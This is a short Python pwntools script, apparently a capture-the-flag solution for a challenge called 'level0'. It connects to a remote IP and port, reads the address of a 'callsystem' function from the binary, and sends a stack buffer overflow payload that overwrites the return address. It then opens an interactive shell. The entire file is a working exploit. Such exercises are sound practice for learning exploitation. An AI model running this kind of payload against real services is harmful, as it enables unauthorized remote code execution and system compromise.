from pwn import *

io = remote('111.200.241.244', 53710)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => %s' % hex(address).upper())
payload = b'a'*(0x80) + b'fuckpwn!' + p64(address)
# payload = b'a'*(0x80) + b'fuckpwn!' + p64(0x400596)
io.sendline(payload)
io.interactive()